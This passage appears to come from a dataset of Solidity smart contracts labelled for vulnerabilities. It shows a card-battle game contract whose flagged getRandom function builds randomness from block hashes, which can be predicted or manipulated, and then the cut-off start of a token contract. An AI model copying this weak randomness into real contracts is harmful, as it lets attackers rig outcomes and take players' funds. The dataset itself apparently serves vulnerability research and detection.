  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n emit Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n emit Unpause();\n }\n}\ncontract BattleBase is Ownable {\n using SafeMath for uint256;\n event BattleHistory(\n uint256 historyId,\n uint8 winner,\n uint64 battleTime,\n uint256 sequence,\n uint256 blockNumber,\n uint256 tokensGained);\n event BattleHistoryChallenger(\n uint256 historyId,\n uint256 cardId,\n uint8 element,\n uint16 level,\n uint32 attack,\n uint32 defense,\n uint32 hp,\n uint32 speed,\n uint32 criticalRate,\n uint256 rank);\n event BattleHistoryDefender(\n uint256 historyId,\n uint256 cardId,\n uint8 element,\n uint16 level,\n uint32 attack,\n uint32 defense,\n uint32 hp,\n uint32 speed,\n uint16 criticalRate,\n uint256 rank);\n event RejectChallenge(\n uint256 challengerId,\n uint256 defenderId,\n uint256 defenderRank,\n uint8 rejectCode,\n uint256 blockNumber);\n event HashUpdated(\n uint256 cardId,\n uint256 cardHash);\n event LevelUp(uint256 cardId);\n event CardCreated(address owner, uint256 cardId);\n uint32[] expToNextLevelArr = [0,103,103,207,207,207,414,414,414,414,724,724,724,828,828,931,931,1035,1035,1138,1138,1242,1242,1345,1345,1449,1449,1552,1552,1656,1656,1759,1759,1863,1863,1966,1966,2070,2070,2173,2173,2173,2277,2277,2380,2380,2484,2484,2587,2587,2691,2691,2794,2794,2898,2898,3001,3001,3105,3105,3208,3208,3312,3312,3415,3415,3519,3519,3622,3622,3622,3726,3726,3829,3829,3933,3933,4036,4036,4140,4140,4243,4243,4347,4347,4450,4450,4554,4554,4657,4657,4761,4761,4864,4864,4968,4968,5071,5071,5175];\n uint32[] activeWinExp = [10,11,14,19,26,35,46,59,74,91,100,103,108,116,125,135,146,158,171,185,200,215,231,248,265,283,302,321,341,361,382];\n struct Card {\n uint8 element;\n uint16 level;\n uint32 attack;\n uint32 defense;\n uint32 hp;\n uint32 speed;\n uint16 criticalRate;\n uint32 flexiGems;\n uint256 cardHash;\n uint32 currentExp;\n uint32 expToNextLevel;\n uint64 createdDatetime;\n uint256 rank;\n }\n mapping (uint256 => Card) public cards;\n uint256[] ranking;\n mapping (uint256 => uint256) public rankTokens;\n uint8 public currentElement = 0;\n uint256 public historyId = 0;\n HogSmashToken public hogsmashToken;\n Marketplace public marketplace;\n uint256 public challengeFee;\n uint256 public upgradeFee;\n uint256 public avatarFee;\n uint256 public referrerFee;\n uint256 public developerCut;\n uint256 internal totalDeveloperCut;\n uint256 public cardDrawPrice;\n uint8 public upgradeGems;\n uint8 public upgradeGemsSpecial;\n uint16 public gemAttackConversion;\n uint16 public gemDefenseConversion;\n uint16 public gemHpConversion;\n uint16 public gemSpeedConversion;\n uint16 public gemCriticalRateConversion;\n uint8 public goldPercentage;\n uint8 public silverPercentage;\n uint32 public eventCardRangeMin;\n uint32 public eventCardRangeMax;\n uint8 public maxBattleRounds;\n uint256 internal totalRankTokens;\n bool internal battleStart;\n bool internal starterPackOnSale;\n uint256 public starterPackPrice;\n uint16 public starterPackCardLevel;\n function setMarketplaceAddress(address _address) external onlyOwner {\n Marketplace candidateContract = Marketplace(_address);\n require(candidateContract.isMarketplace(),\"needs to be marketplace\");\n marketplace = candidateContract;\n }\n function setSettingValues( uint8 _upgradeGems,\n uint8 _upgradeGemsSpecial,\n uint16 _gemAttackConversion,\n uint16 _gemDefenseConversion,\n uint16 _gemHpConversion,\n uint16 _gemSpeedConversion,\n uint16 _gemCriticalRateConversion,\n uint8 _goldPercentage,\n uint8 _silverPercentage,\n uint32 _eventCardRangeMin,\n uint32 _eventCardRangeMax,\n uint8 _newMaxBattleRounds) external onlyOwner {\n require(_eventCardRangeMax >= _eventCardRangeMin, \"range max must be larger or equals range min\" );\n require(_eventCardRangeMax<100000000, \"range max cannot exceed 99999999\");\n require((_newMaxBattleRounds <= 128) && (_newMaxBattleRounds >0), \"battle rounds must be between 0 and 128\");\n upgradeGems = _upgradeGems;\n upgradeGemsSpecial = _upgradeGemsSpecial;\n gemAttackConversion = _gemAttackConversion;\n gemDefenseConversion = _gemDefenseConversion;\n gemHpConversion = _gemHpConversion;\n gemSpeedConversion = _gemSpeedConversion;\n gemCriticalRateConversion = _gemCriticalRateConversion;\n goldPercentage = _goldPercentage;\n silverPercentage = _silverPercentage;\n eventCardRangeMin = _eventCardRangeMin;\n eventCardRangeMax = _eventCardRangeMax;\n maxBattleRounds = _newMaxBattleRounds;\n }\n function setStarterPack(uint256 _newStarterPackPrice, uint16 _newStarterPackCardLevel) external onlyOwner {\n require(_newStarterPackCardLevel<=20, \"starter pack level cannot exceed 20\");\n starterPackPrice = _newStarterPackPrice;\n starterPackCardLevel = _newStarterPackCardLevel;\n }\n function setStarterPackOnSale(bool _newStarterPackOnSale) external onlyOwner {\n starterPackOnSale = _newStarterPackOnSale;\n }\n function setBattleStart(bool _newBattleStart) external onlyOwner {\n battleStart = _newBattleStart;\n }\n function setCardDrawPrice(uint256 _newCardDrawPrice) external onlyOwner {\n cardDrawPrice = _newCardDrawPrice;\n }\n function setReferrerFee(uint256 _newReferrerFee) external onlyOwner {\n referrerFee = _newReferrerFee;\n }\n function setChallengeFee(uint256 _newChallengeFee) external onlyOwner {\n challengeFee = _newChallengeFee;\n }\n function setUpgradeFee(uint256 _newUpgradeFee) external onlyOwner {\n upgradeFee = _newUpgradeFee;\n }\n function setAvatarFee(uint256 _newAvatarFee) external onlyOwner {\n avatarFee = _newAvatarFee;\n }\n function setDeveloperCut(uint256 _newDeveloperCut) external onlyOwner {\n developerCut = _newDeveloperCut;\n }\n function getTotalDeveloperCut() external view onlyOwner returns (uint256) {\n return totalDeveloperCut;\n }\n function getTotalRankTokens() external view returns (uint256) {\n return totalRankTokens;\n }\n function getSettingValues() external view returns( uint8 _upgradeGems,\n uint8 _upgradeGemsSpecial,\n uint16 _gemAttackConversion,\n uint16 _gemDefenseConversion,\n uint16 _gemHpConversion,\n uint16 _gemSpeedConversion,\n uint16 _gemCriticalRateConversion,\n uint8 _maxBattleRounds)\n {\n _upgradeGems = uint8(upgradeGems);\n _upgradeGemsSpecial = uint8(upgradeGemsSpecial);\n _gemAttackConversion = uint16(gemAttackConversion);\n _gemDefenseConversion = uint16(gemDefenseConversion);\n _gemHpConversion = uint16(gemHpConversion);\n _gemSpeedConversion = uint16(gemSpeedConversion);\n _gemCriticalRateConversion = uint16(gemCriticalRateConversion);\n _maxBattleRounds = uint8(maxBattleRounds);\n }\n}\ncontract Random {\n uint private pSeed = block.number;\n function getRandom() internal returns(uint256) {\n return (pSeed = uint(keccak256(abi.encodePacked(pSeed,\n blockhash(block.number - 1),\n blockhash(block.number - 3),\n blockhash(block.number - 5),\n blockhash(block.number - 7))\n )));\n }\n}\ncontract Battle is BattleBase, Random, Pausable {\n constructor(address _tokenAddress) public {\n HogSmashToken candidateContract = HogSmashToken(_tokenAddress);\n hogsmashToken = candidateContract;\n starterPackPrice = 30000000000000000;\n starterPackCardLevel = 5;\n starterPackOnSale = true;\n challengeFee = 10000000000000000;\n upgradeFee = 10000000000000000;\n avatarFee = 50000000000000000;\n developerCut = 375;\n referrerFee = 2000;\n cardDrawPrice = 15000000000000000;\n battleStart = true;\n paused = false;\n totalDeveloperCut = 0;\n }\n modifier onlyOwnerOf(uint256 _tokenId) {\n require(hogsmashToken.ownerOf(_tokenId) == msg.sender, \"must be owner of token\");\n _;\n }\n function getCard(uint256 _id) external view returns (\n uint256 cardId,\n address owner,\n uint8 element,\n uint16 level,\n uint32[] stats,\n uint32 currentExp,\n uint32 expToNextLevel,\n uint256 cardHash,\n uint64 createdDatetime,\n uint256 rank\n ) {\n cardId = _id;\n owner = hogsmashToken.ownerOf(_id);\n Card storage card = cards[_id];\n uint32[] memory tempStats = new uint32[](6);\n element = uint8(card.element);\n level = uint16(card.level);\n tempStats[0] = uint32(card.attack);\n tempStats[1] = uint32(card.defense);\n tempStats[2] = uint32(card.hp);\n tempStats[3] = uint32(card.speed);\n tempStats[4] = uint16(card.criticalRate);\n tempStats[5] = uint32(card.flexiGems);\n stats = tempStats;\n currentExp = uint32(card.currentExp);\n expToNextLevel = uint32(card.expToNextLevel);\n cardHash = uint256(card.cardHash);\n createdDatetime = uint64(card.createdDatetime);\n rank = uint256(card.rank);\n }\n function getCardIdByRank(uint256 _rank) external view returns(uint256 cardId) {\n return ranking[_rank];\n }\n function draftNewCard() external payable whenNotPaused returns (uint256) {\n require(msg.value == cardDrawPrice, \"fee must be equal to draw price\");\n require(address(marketplace) != address(0), \"marketplace not set\");\n hogsmashToken.setApprovalForAllByContract(msg.sender, marketplace, true);\n totalDeveloperCut = totalDeveloperCut.add(cardDrawPrice);\n return _createCard(msg.sender, 1);\n }\n function draftNewCardWithReferrer(address referrer) external payable whenNotPaused returns (uint256 cardId) {\n require(msg.value == cardDrawPrice, \"fee must be equal to draw price\");\n require(address(marketplace) != address(0), \"marketplace not set\");\n hogsmashToken.setApprovalForAllByContract(msg.sender, marketplace, true);\n cardId = _createCard(msg.sender, 1);\n if ((referrer != address(0)) && (referrerFee!=0) && (referrer!=msg.sender) && (hogsmashToken.balanceOf(referrer)>0)) {\n uint256 referrerCut = msg.value.mul(referrerFee)/10000;\n require(referrerCut<=msg.value, \"referre cut cannot be larger than fee\");\n referrer.transfer(referrerCut);\n totalDeveloperCut = totalDeveloperCut.add(cardDrawPrice.sub(referrerCut));\n } else {\n totalDeveloperCut = totalDeveloperCut.add(cardDrawPrice);\n }\n }\n function levelUp( uint256 _id,\n uint16 _attackLevelUp,\n uint16 _defenseLevelUp,\n uint16 _hpLevelUp,\n uint16 _speedLevelUp,\n uint16 _criticalRateLevelUp,\n uint16 _flexiGemsLevelUp) external payable whenNotPaused onlyOwnerOf(_id) {\n require(\n _attackLevelUp >= 0 &&\n _defenseLevelUp >= 0 &&\n _hpLevelUp >= 0 &&\n _speedLevelUp >= 0 &&\n _criticalRateLevelUp >= 0 &&\n _flexiGemsLevelUp >= 0, \"level up attributes must be more than 0\"\n );\n require(msg.value == upgradeFee, \"fee must be equals to upgrade price\");\n Card storage card = cards[_id];\n require(card.currentExp==card.expToNextLevel, \"exp is not max yet for level up\");\n require(card.level < 65535, \"card level maximum has reached\");\n require((card.criticalRate + (_criticalRateLevelUp * gemCriticalRateConversion))<=7000, \"critical rate max of 70 has reached\");\n uint totalInputGems = _attackLevelUp + _defenseLevelUp + _hpLevelUp;\n totalInputGems += _speedLevelUp + _criticalRateLevelUp + _flexiGemsLevelUp;\n uint16 numOfSpecials = 0;\n if ((card.level > 1) && (card.attack==1) && (card.defense==1) && (card.hp==3) && (card.speed==1) && (card.criticalRate==25) && (card.flexiGems==1)) {\n numOfSpecials = (card.level+1)/5;\n uint totalGems = (numOfSpecials * upgradeGemsSpecial) + (((card.level) - numOfSpecials) * upgradeGems);\n require(totalInputGems==totalGems, \"upgrade gems not used up\");\n } else {\n if (((card.level+1)%5)==0) {\n require(totalInputGems==upgradeGemsSpecial, \"upgrade gems not used up\");\n numOfSpecials = 1;\n } else {\n require(totalInputGems==upgradeGems, \"upgrade gems not used up\");\n }\n }\n totalDeveloperCut = totalDeveloperCut.add(upgradeFee);\n _upgradeLevel(_id, _attackLevelUp, _defenseLevelUp, _hpLevelUp, _speedLevelUp, _criticalRateLevelUp, _flexiGemsLevelUp, numOfSpecials);\n emit LevelUp(_id);\n }\n function _upgradeLevel( uint256 _id,\n uint16 _attackLevelUp,\n uint16 _defenseLevelUp,\n uint16 _hpLevelUp,\n uint16 _speedLevelUp,\n uint16 _criticalRateLevelUp,\n uint16 _flexiGemsLevelUp,\n uint16 numOfSpecials) private {\n Card storage card = cards[_id];\n uint16[] memory extraStats = new uint16[](5);\n if (numOfSpecials>0) {\n if (card.cardHash%100 >= 70) {\n uint cardType = (uint(card.cardHash/10000000000))%100;\n if (cardType < 20) {\n extraStats[0]+=numOfSpecials;\n } else if (cardType < 40) {\n extraStats[1]+=numOfSpecials;\n } else if (cardType < 60) {\n extraStats[2]+=numOfSpecials;\n } else if (cardType < 80) {\n extraStats[3]+=numOfSpecials;\n } else {\n extraStats[4]+=numOfSpecials;\n }\n if (card.cardHash%100 >=90) {\n uint cardTypeInner = cardType%10;\n if (cardTypeInner < 2) {\n extraStats[0]+=numOfSpecials;\n } else if (cardTypeInner < 4) {\n extraStats[1]+=numOfSpecials;\n } else if (cardTypeInner < 6) {\n extraStats[2]+=numOfSpecials;\n } else if (cardTypeInner < 8) {\n extraStats[3]+=numOfSpecials;\n } else {\n extraStats[4]+=numOfSpecials;\n }\n }\n }\n }\n card.attack += (_attackLevelUp + extraStats[0]) * gemAttackConversion;\n card.defense += (_defenseLevelUp + extraStats[1]) * gemDefenseConversion;\n card.hp += (_hpLevelUp + extraStats[2]) * gemHpConversion;\n card.speed += (_speedLevelUp + extraStats[3]) * gemSpeedConversion;\n card.criticalRate += uint16(_criticalRateLevelUp * gemCriticalRateConversion);\n card.flexiGems += _flexiGemsLevelUp + extraStats[4];\n card.level += 1;\n card.currentExp = 0;\n uint256 tempExpLevel = card.level;\n if (tempExpLevel > expToNextLevelArr.length) {\n tempExpLevel = expToNextLevelArr.length;\n }\n card.expToNextLevel = expToNextLevelArr[tempExpLevel];\n }\n function max(uint a, uint b) private pure returns (uint) {\n return a > b ? a : b;\n }\n function challenge( uint256 _challengerCardId,\n uint32[5] _statUp,\n uint256 _defenderCardId,\n uint256 _defenderRank,\n uint16 _defenderLevel) external payable whenNotPaused onlyOwnerOf(_challengerCardId) {\n require(battleStart != false, \"battle has not started\");\n require(msg.sender != hogsmashToken.ownerOf(_defenderCardId), \"cannot challenge own cards\");\n Card storage challenger = cards[_challengerCardId];\n require((_statUp[0] + _statUp[1] + _statUp[2] + _statUp[3] + _statUp[4])==challenger.flexiGems, \"flexi gems not used up\");\n Card storage defender = cards[_defenderCardId];\n if (defender.rank != _defenderRank) {\n emit RejectChallenge(_challengerCardId, _defenderCardId, _defenderRank, 1, uint256(block.number));\n (msg.sender).transfer(msg.value);\n return;\n }\n if (defender.level != _defenderLevel) {\n emit RejectChallenge(_challengerCardId, _defenderCardId, _defenderRank, 2, uint256(block.number));\n (msg.sender).transfer(msg.value);\n return;\n }\n uint256 requiredChallengeFee = challengeFee;\n if (defender.rank <150) {\n requiredChallengeFee = requiredChallengeFee.mul(2);\n }\n require(msg.value == requiredChallengeFee, \"fee must be equals to challenge price\");\n uint256 developerFee = 0;\n if (msg.value > 0) {\n developerFee = _calculateFee(msg.value);\n }\n uint256[] memory stats = new uint256[](14);\n stats[0] = challenger.attack + (_statUp[0] * gemAttackConversion);\n stats[1] = challenger.defense + (_statUp[1] * gemDefenseConversion);\n stats[2] = challenger.hp + (_statUp[2] * gemHpConversion);\n stats[3] = challenger.speed + (_statUp[3] * gemSpeedConversion);\n stats[4] = challenger.criticalRate + (_statUp[4] * gemCriticalRateConversion);\n stats[5] = defender.criticalRate;\n stats[6] = defender.hp;\n stats[8] = challenger.hp + (_statUp[2] * gemHpConversion);\n stats[9] = challenger.rank;\n stats[10] = defender.rank;\n stats[11] = 0;\n stats[12] = _challengerCardId;\n stats[13] = _defenderCardId;\n if (stats[4]>7000) {\n stats[4] = 7000;\n }\n if (stats[5]>7000) {\n stats[5] = 7000;\n }\n if (((challenger.element-1) == defender.element) || ((challenger.element==1) && (defender.element==3)) || ((challenger.element==8) && (defender.element==9))) {\n stats[4] += 3000;\n if (stats[4]>8000) {\n stats[4] = 8000;\n }\n }\n if (((defender.element-1) == challenger.element) || ((defender.element==1) && (challenger.element==3)) || ((defender.element==8) && (challenger.element==9))) {\n stats[5] += 3000;\n if (stats[5]>8000) {\n stats[5] = 8000;\n }\n }\n uint256 battleSequence = _simulateBattle(challenger, defender, stats);\n stats[11] = _transferFees(_challengerCardId, stats, developerFee);\n emit BattleHistory(\n historyId,\n uint8(stats[7]),\n uint64(now),\n uint256(battleSequence),\n uint256(block.number),\n uint256(stats[11])\n );\n emit BattleHistoryChallenger(\n historyId,\n uint256(_challengerCardId),\n uint8(challenger.element),\n uint16(challenger.level),\n uint32(stats[0]),\n uint32(stats[1]),\n uint32(stats[8]),\n uint32(stats[3]),\n uint16(stats[4]),\n uint256(stats[9])\n );\n emit BattleHistoryDefender(\n historyId,\n uint256(_defenderCardId),\n uint8(defender.element),\n uint16(defender.level),\n uint32(defender.attack),\n uint32(defender.defense),\n uint32(defender.hp),\n uint32(defender.speed),\n uint16(stats[5]),\n uint256(stats[10])\n );\n historyId = historyId.add(1);\n }\n function _addBattleSequence(uint8 attackType, uint8 rounds, uint256 battleSequence) private pure returns (uint256) {\n uint256 mask = 0x3;\n mask = ~(mask << 2*rounds);\n uint256 newSeq = battleSequence & mask;\n newSeq = newSeq | (uint256(attackType) << 2*rounds);\n return newSeq;\n }\n function _simulateBattle(Card storage challenger, Card storage defender, uint[] memory stats) private returns (uint256 battleSequence) {\n bool continueBattle = true;\n uint8 currentAttacker = 0;\n uint256 tempAttackStrength;\n uint8 battleRound = 0;\n if (!_isChallengerAttackFirst(stats[3], defender.speed)){\n currentAttacker = 1;\n }\n while (continueBattle) {\n if (currentAttacker==0) {\n if (_rollCriticalDice() <= stats[4]){\n tempAttackStrength = stats[0] * 2;\n battleSequence = _addBattleSequence(2, battleRound, battleSequence);\n } else {\n tempAttackStrength = stats[0];\n battleSequence = _addBattleSequence(0, battleRound, battleSequence);\n }\n if (tempAttackStrength <= defender.defense) {\n tempAttackStrength = 1;\n } else {\n tempAttackStrength -= defender.defense;\n }\n if (stats[6] <= tempAttackStrength) {\n stats[6] = 0;\n } else {\n stats[6] -= tempAttackStrength;\n }\n currentAttacker = 1;\n } else if (currentAttacker==1) {\n if (_rollCriticalDice() <= stats[5]){\n tempAttackStrength = defender.attack * 2;\n battleSequence = _addBattleSequence(3, battleRound, battleSequence);\n } else {\n tempAttackStrength = defender.attack;\n battleSequence = _addBattleSequence(1, battleRound, battleSequence);\n }\n if (tempAttackStrength <= stats[1]) {\n tempAttackStrength = 1;\n } else {\n tempAttackStrength -= stats[1];\n }\n if (stats[2] <= tempAttackStrength) {\n stats[2] = 0;\n } else {\n stats[2] -= tempAttackStrength;\n }\n currentAttacker = 0;\n }\n battleRound ++;\n if ((battleRound>=maxBattleRounds) || (stats[6]<=0) || (stats[2]<=0)){\n continueBattle = false;\n }\n }\n uint32 challengerGainExp = 0;\n uint32 defenderGainExp = 0;\n if (challenger.level == defender.level) {\n challengerGainExp = activeWinExp[10];\n } else if (challenger.level > defender.level) {\n if ((challenger.level - defender.level) >= 11) {\n challengerGainExp = 1;\n } else {\n challengerGainExp = activeWinExp[10 + defender.level - challenger.level];\n }\n } else if (challenger.level < defender.level) {\n uint256 levelDiff = defender.level - challenger.level;\n if (levelDiff > 20) {\n levelDiff = 20;\n }\n challengerGainExp = activeWinExp[10+levelDiff];\n }\n if (stats[2] == stats[6]) {\n stats[7] = 2;\n } else if (stats[2] > stats[6]) {\n stats[7] = 0;\n if (defender.rank < challenger.rank) {\n ranking[defender.rank] = stats[12];\n ranking[challenger.rank] = stats[13];\n uint256 tempRank = defender.rank;\n defender.rank = challenger.rank;\n challenger.rank = tempRank;\n }\n challenger.currentExp += challengerGainExp;\n if (challenger.currentExp > challenger.expToNextLevel) {\n challenger.currentExp = challenger.expToNextLevel;\n }\n defenderGainExp = ((challengerGainExp*105/100) + 5)/10;\n if (defenderGainExp <= 0) {\n defenderGainExp = 1;\n }\n defender.currentExp += defenderGainExp;\n if (defender.currentExp > defender.expToNextLevel) {\n defender.currentExp = defender.expToNextLevel;\n }\n } else if (stats[6] > stats[2]) {\n stats[7] = 1;\n uint32 tempChallengerGain = challengerGainExp*35/100;\n if (tempChallengerGain <= 0) {\n tempChallengerGain = 1;\n }\n challenger.currentExp += tempChallengerGain;\n if (challenger.currentExp > challenger.expToNextLevel) {\n challenger.currentExp = challenger.expToNextLevel;\n }\n defenderGainExp = challengerGainExp*30/100;\n if (defenderGainExp <= 0) {\n defenderGainExp = 1;\n }\n defender.currentExp += defenderGainExp;\n if (defender.currentExp > defender.expToNextLevel) {\n defender.currentExp = defender.expToNextLevel;\n }\n }\n return battleSequence;\n }\n function _transferFees(uint256 _challengerCardId, uint[] stats, uint256 developerFee) private returns (uint256 totalGained) {\n totalDeveloperCut = totalDeveloperCut.add(developerFee);\n uint256 remainFee = msg.value.sub(developerFee);\n totalGained = 0;\n if (stats[7] == 1) {\n rankTokens[stats[10]] = rankTokens[stats[10]].add(remainFee);\n totalRankTokens = totalRankTokens.add(remainFee);\n } else {\n address challengerAddress = hogsmashToken.ownerOf(_challengerCardId);\n if (stats[7] == 0) {\n if (stats[9] > stats[10]) {\n if (rankTokens[stats[10]] > 0) {\n totalGained = totalGained.add(rankTokens[stats[10]]);\n totalRankTokens = totalRankTokens.sub(rankTokens[stats[10]]);\n rankTokens[stats[10]] = 0;\n }\n if (rankTokens[stats[9]] > 0) {\n totalGained = totalGained.add(rankTokens[stats[9]]);\n totalRankTokens = totalRankTokens.sub(rankTokens[stats[9]]);\n rankTokens[stats[9]] = 0;\n }\n } else {\n if (stats[9]<50) {\n if ((stats[10] < 150) && (rankTokens[stats[10]] > 0)) {\n totalGained = totalGained.add(rankTokens[stats[10]]);\n totalRankTokens = totalRankTokens.sub(rankTokens[stats[10]]);\n rankTokens[stats[10]] = 0;\n }\n if ((stats[10] < 150) && (rankTokens[stats[9]] > 0)) {\n totalGained = totalGained.add(rankTokens[stats[9]]);\n totalRankTokens = totalRankTokens.sub(rankTokens[stats[9]]);\n rankTokens[stats[9]] = 0;\n }\n }\n }\n challengerAddress.transfer(totalGained.add(remainFee));\n } else {\n challengerAddress.transfer(remainFee);\n }\n }\n }\n function _rollCriticalDice() private returns (uint16 result){\n return uint16((getRandom() % 10000) + 1);\n }\n function _isChallengerAttackFirst(uint _challengerSpeed, uint _defenderSpeed ) private returns (bool){\n uint8 randResult = uint8((getRandom() % 100) + 1);\n uint challengerChance = (((_challengerSpeed * 10 ** 3) / (_challengerSpeed + _defenderSpeed))+5) / 10;\n if (randResult <= challengerChance) {\n return true;\n } else {\n return false;\n }\n }\n function buyStarterPack() external payable whenNotPaused returns (uint256){\n require(starterPackOnSale==true, \"starter pack is not on sale\");\n require(msg.value==starterPackPrice, \"fee must be equals to starter pack price\");\n require(address(marketplace) != address(0), \"marketplace not set\");\n totalDeveloperCut = totalDeveloperCut.add(starterPackPrice);\n hogsmashToken.setApprovalForAllByContract(msg.sender, marketplace, true);\n return _createCard(msg.sender, starterPackCardLevel);\n }\n function _createCard(address _to, uint16 _initLevel) private returns (uint256) {\n require(_to != address(0), \"cannot create card for unknown address\");\n currentElement+= 1;\n if (currentElement==4) {\n currentElement = 8;\n }\n if (currentElement == 10) {\n currentElement = 1;\n }\n uint256 tempExpLevel = _initLevel;\n if (tempExpLevel > expToNextLevelArr.length) {\n tempExpLevel = expToNextLevelArr.length;\n }\n uint32 tempCurrentExp = 0;\n if (_initLevel>1) {\n tempCurrentExp = expToNextLevelArr[tempExpLevel];\n }\n uint256 tokenId = hogsmashToken.mint(_to);\n Card memory _card = Card({\n element: currentElement,\n level: _initLevel,\n attack: 1,\n defense: 1,\n hp: 3,\n speed: 1,\n criticalRate: 25,\n flexiGems: 1,\n currentExp: tempCurrentExp,\n expToNextLevel: expToNextLevelArr[tempExpLevel],\n cardHash: generateHash(),\n createdDatetime :uint64(now),\n rank: tokenId\n });\n cards[tokenId] = _card;\n ranking.push(tokenId);\n emit CardCreated(msg.sender, tokenId);\n return tokenId;\n }\n function generateHash() private returns (uint256 hash){\n hash = uint256((getRandom()%1000000000000)/10000000000);\n hash = hash.mul(10000000000);\n uint256 tempHash = ((getRandom()%(eventCardRangeMax-eventCardRangeMin+1))+eventCardRangeMin)*100;\n hash = hash.add(tempHash);\n tempHash = getRandom()%100;\n if (tempHash < goldPercentage) {\n hash = hash.add(90);\n } else if (tempHash < (goldPercentage+silverPercentage)) {\n hash = hash.add(70);\n } else {\n hash = hash.add(50);\n }\n }\n function updateAvatar(uint256 _cardId, uint256 avatarHash) external payable whenNotPaused onlyOwnerOf(_cardId) {\n require(msg.value==avatarFee, \"fee must be equals to avatar price\");\n Card storage card = cards[_cardId];\n uint256 tempHash = card.cardHash%1000000000000;\n card.cardHash = tempHash.add(avatarHash.mul(1000000000000));\n emit HashUpdated(_cardId, card.cardHash);\n }\n function _calculateFee(uint256 _challengeFee) internal view returns (uint256) {\n return developerCut.mul(_challengeFee/10000);\n }\n function generateInitialCard(uint16 _cardLevel) external whenNotPaused onlyOwner returns (uint256) {\n require(address(marketplace) != address(0), \"marketplace not set\");\n require(_cardLevel<=20, \"maximum level cannot exceed 20\");\n hogsmashToken.setApprovalForAllByContract(msg.sender, marketplace, true);\n return _createCard(msg.sender, _cardLevel);\n }\n function distributeTokensToRank(uint[] ranks, uint256 tokensPerRank) external payable onlyOwner {\n require(msg.value == (tokensPerRank*ranks.length), \"tokens must be enough to distribute among ranks\");\n uint i;\n for (i=0; i<ranks.length; i++) {\n rankTokens[ranks[i]] = rankTokens[ranks[i]].add(tokensPerRank);\n totalRankTokens = totalRankTokens.add(tokensPerRank);\n }\n }\n function withdrawBalance() external onlyOwner {\n address thisAddress = this;\n uint256 balance = thisAddress.balance;\n uint256 withdrawalSum = totalDeveloperCut;\n if (balance >= withdrawalSum) {\n totalDeveloperCut = 0;\n owner.transfer(withdrawalSum);\n }\n }\n}\ninterface Marketplace {\n function isMarketplace() external returns (bool);\n}\ninterface HogSmashToken {\n function ownerOf(uint256 _tokenId) external view returns (address);\n function balanceOf(address _owner) external view returns (uint256);\n function tokensOf(address _owner) external view returns (uint256[]);\n function mint(address _to) external returns (uint256 _tokenId);\n function setTokenURI(uint256 _tokenId, string _uri) external;\n function setApprovalForAllByContract(address _sender, address _to, bool _approved) external;\n}",
  "extract_feature": [
    "function getRandom() internal returns(uint256) {\nreturn (pSeed = uint(keccak256(abi.encodePacked(pSeed,\nblockhash(block.number - 1),\nblockhash(block.number - 3),\nblockhash(block.number - 5),\nblockhash(block.number - 7))\n)));\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6a750a970a4fdc0b5c"
  },
  "filename": "2805.sol",
  "content": "pragma solidity ^0.4.9;\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function assert(bool assertion) internal {\n if (!assertion) throw;\n }\n}\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n uint public decimals;\n string public name;\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping(address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ReserveToken is StandardToken, SafeMath {\n address public minter;\n function ReserveToken() {\n minter = msg.sender;\n }\n function create(address account, uint amount) {\n if (msg.sender != minter) throw;\n balances[account] = safeAdd(balances[account], amount);\n totalSupply = safeAdd(totalSupply, amount);\n }\n function destroy(address account, uint amount) {\n if (msg.sender != minter) throw;\n if (balances[account] < amount) throw;\n balances[account] = safeSub(balances[account], amount);\n totalSupply = safeSub(totalSupply, amount);\n }\n}\ncontract AccountLevels {\n function accountLevel(address user) constant returns(uint) 